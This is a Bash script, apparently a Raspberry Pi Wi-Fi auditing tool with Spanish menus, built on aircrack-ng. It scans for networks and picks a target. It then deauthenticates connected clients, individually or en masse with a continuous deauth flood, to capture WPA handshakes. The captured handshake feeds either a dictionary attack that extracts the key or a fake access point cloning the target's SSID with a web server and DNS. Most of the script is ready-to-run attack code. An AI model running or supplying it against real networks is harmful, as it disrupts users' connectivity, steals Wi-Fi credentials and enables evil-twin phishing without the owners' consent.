# Constantes
INTERFAZ="awus"
WDIR=$(realpath .)
AIRCRACK=$(which aircrack-ng)
AIRODUMP=$(which airodump-ng)
AIREPLAY=$(which aireplay-ng)

path="$WDIR/"
outFile="lista_redes"
iFile="lista_redes-01.csv"
redes="redes_disponibles"
diccionarios="diccionarios/"

aireplay_kill() {
    for pid in $(pgrep $(basename "$AIREPLAY")); do
        { kill $pid && wait $pid &>/dev/null; }
    done
}

airodump_kill() {
    for pid in $(pgrep $(basename "$AIRODUMP")); do
        { kill $pid && wait $pid; } &>/dev/null
    done
}

fake_ap () {
    { aireplay-ng --deauth 0 -a ${mac_red} awus &>/dev/null & }
    sleep 1
    # -z 2 Para añadir candado
    { airbase-ng -e ${nombre_red} -c ${c} awus &>/dev/null & }
    sleep 2
    ifconfig at0 192.168.2.1
    lighttpd -f /etc/lighttpd/lighttpd.conf &>/dev/null
    systemctl start dnsmasq
    exit 1
    #sleep 40

    #sed -i "s/^ssid.*/ssid=${nombre_red}/" /etc/hostapd/hostapd.conf // HOSTAPD
    #systemctl start hostapd
}

brute_force() {
    if [ "$(aircrack-ng -a2 -q -w "$path$diccionarios"dict.txt *.cap -b ${mac_red} |grep 'KEY FOUND!' &>/dev/null; echo $?)" == "0" ]; then
        aircrack-ng -a2 -q -w "$path$diccionarios"dict.txt "$path"*.cap -b ${mac_red} | grep 'KEY FOUND!' | cut -d'[' -f2  | cut -d ']' -f1 > "$nombre_red"_password.txt
        echo -n -e "\e[92mClave encontrada:\e[0m "
        cat "$nombre_red"_password.txt
    else
        echo -e "\e[91mClave no encontrada\e[0m"
    fi
}

canales() {
    echo -e "\n\e[1;4mCANALES OCUPADOS: \e[0m\n"
    for i in $(cat lista_redes-01.csv |tr -d ' ' | cut -d ',' -f 4 | egrep ^[0-9]+$ |sort -n |uniq -c | awk '{print $1","$2}'); do
        redes_count=$(echo ${i} | cut -d',' -f1)
        canal=$(echo ${i} | cut -d',' -f2)

        if [ $redes_count -le 3 ]; then
            echo -e "${canal} - \e[92mRECOMENDADO\e[0m"
        elif [ $redes_count -le 6 ]; then
            echo -e "${canal} - \e[33mPOCO RECOMENDADO\e[0m"
        else
            echo -e "${canal} - \e[31mNO RECOMENDADO\e[0m"
        fi
    done
}

canales2() {
    $(cat lista_redes-01.csv |tr -d ' ' | cut -d ',' -f 4 | egrep ^[0-9]+$ |sort -n |uniq -c | awk '{print $1","$2}' > canales)
    echo -e "\e[1;4mCANALES LIBRES: \e[0m\n"
    for i in {1..13}; do
        if [ "$(cat canales | cut -d',' -f2 | grep -cE "^${i}([^0-9]|$)")" == "0" ]; then
            echo -e "${i} - \e[32mMUY RECOMENDADO\e[0m"
        fi
    done
}

temp_del() {
    rm -f "$path$iFile"
    rm -f "$path$redes"
    rm -f "$path"routers
    rm -f "$path"*.cap
    rm -f "$path"wifi
    rm -f "$path"conectados
    rm -f "$path"escaneo
    rm -f "$path"canales
}

echo -e "\n\e[94m###################################\e[0m"
echo -e "\e[94m####\e[0m   \e[1;33mR A S P A U D I T O R\e[0m   \e[94m####\e[0m"
echo -e "\e[94m###################################\e[0m\n"

# Elegir accion
echo -e "\e[33m    1. Fake AP"
echo -e "    2. Ataque por diccionario"
echo -e "    3. Canales\e[0m\n"
read -p "· Elija la opción deseada: " opcion
echo -e

# Elegir tiempo escaneo
read -p "Introducir tiempo de escaneo (recomendado 30 segundos): " t

scan_redes() {
    $(tr -d ' ' < $path$iFile 2>/dev/null | awk '/BSSID/{y=1;next}y' | awk -F ',' '$14 > 0 {printf "%s %s\n", $1, $14}' > wifi)
    $(tr -d ' ' < $path$iFile 2>/dev/null | awk '/Station/{y=1;next}y' | awk -F ',' '{print $6}' | grep -v [\(] | sort -u | sed '/^\s*$/d' > conectados)
    for i in $(cat wifi | tr ' ' ',')
    do
        mac=$(echo ${i} | cut -d',' -f1)
        name=$(echo ${i} | cut -d',' -f2)
        count=$(cat conectados | grep ${mac} | wc -l)
        if [ ${count} -gt 0 ]; then
            echo -e "${mac} - ${name} (\e[91m*\e[33m)"
        else
            echo "${mac} - ${name}"
        fi
    done > escaneo
}

comp_handshake() {
    if [ "$(aircrack-ng "$path$nombre_red"-01.cap | grep handshake | cut -d '(' -f2 | grep -Eo '[0-9]')" == "1" ]; then
        echo -e "\e[92mHandkshake obtenido\e[0"
        airodump_kill
        if [ $opcion -eq 1 ]; then
            fake_ap
            echo -e
            temp_del
            exit 1
        else
            brute_force
            echo -e
            temp_del
            exit 1
        fi
    else
        echo -e "\e[91mNo se ha podido obtener el handshake\e[0m\n"
        read -p "Deseas volver a intentarlo? [y/n] " resp2
        if [ "$resp2" == "y" ]; then
            deauth
            comp_handshake
        else
            airodump_kill
            temp_del
        fi
    fi
}

# Escaneo de redes
echo -e "Escaneando redes..."
{ "$AIRODUMP" -w $path$outFile -o csv $INTERFAZ &>/dev/null & }
sleep $t
airodump_kill

if [ $opcion -eq 3 ]; then
    echo -e
    canales2
    canales
    temp_del
    echo -e
    exit 1
fi

sleep 1

scan_redes
# Eleccion de red objetivo

# Muestra las redes
echo -e "\e[33m"
cat -n escaneo
echo -e "\e[0m"

read -p "Seleccionar numero: " num_red

nombre_red=$(sed -n "${num_red}p" escaneo |cut -d ' ' -f3)
mac_red=$(sed -n "${num_red}p" escaneo |cut -d ' ' -f1)

echo -e "Red seleccionada: ${nombre_red}\n"

# Canal del router objetivo
c=$(tr -d ' ' < $path$iFile 2>/dev/null | grep $mac_red | awk -F ',' 'NR==1{print $4}')

iwconfig $INTERFAZ channel $c
# Capturar handshakes
{ "$AIRODUMP" -c $c --bssid $mac_red -w $path$nombre_red -o pcap $INTERFAZ &>/dev/null & }
sleep 5
# Deautenticacion clientes
m=1
for j in $(tr -d ' ' < $path$iFile 2>/dev/null | awk '/Station/{y=1;next}y' | grep $mac_red | awk -F ',' '{print $1}' | sed '/^\s*$/d'); do
    echo "Intentando deautenticar clientes conectados a $nombre_red"
    # Deautenticar
    echo "Probando con ${j}"
    for n in 1 2 3; do
        { "$AIREPLAY" -0 4 -a $mac_red -c $j -F $INTERFAZ &>/dev/null & }
        echo "Intento ${n}..."
        sleep 5
        comp_handshake
    done
    m=$((m+1))
    echo -e "\e[91m\e[0m"
done

echo -e "\e[91mNo se ha podido obtener el handshake\e[0m\n"

read -p "Deseas probar con deautenticacion masiva? [y/n] " resp1

deauth(){
    { "$AIREPLAY" --deauth 0 -a $mac_red $INTERFAZ &>/dev/null & }
    sleep 2
    aireplay_kill
    sleep 8
}

if [ "$resp1" == "y" ]; then
    deauth
    comp_handshake
else
    airodump_kill
    temp_del
fi



